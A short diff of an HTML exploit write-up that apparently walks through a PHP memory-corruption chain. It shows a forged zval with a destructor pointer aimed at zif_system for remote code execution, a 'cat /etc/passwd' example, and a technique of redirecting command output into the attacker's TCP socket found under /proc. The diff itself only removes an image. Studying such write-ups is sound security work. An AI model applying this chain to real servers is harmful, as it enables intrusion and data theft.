@@ -1505,7 +1505,7 @@ bucket[2].val.u1.type_info = 0x51515151;           // four 'Q' bytes from primer
     → gc.type = IS_ARRAY → zend_array_destroy
     → pDestructor at offset 0x30 = zif_system → system(command) → RCE</code></pre>
 <h3 id="ok-the-command-is-running-how-does-its-output-get-back-to-us">ok the command is running.. how does its output get back to us?</h3>
-<img src="images/command.jpg" >
+    
 <p>Think about it. The command is being executed inside a cleanup callback. PHP isn't in the middle of building an HTTP response. It's in the middle of tearing down a failed request. There's no output buffer connected to the client. If we just ran <code>cat /etc/passwd</code>, the output would vanish into the server's stdout (maybe a log file, maybe <code>/dev/null</code>).</p>
 <p>So how does the attacker get the output? <strong>they find their own TCP socket inside <code>/proc</code> and redirect the output there</strong>.</p>
 <pre data-lang="python"><code class="language-python">def build_command(nonce):
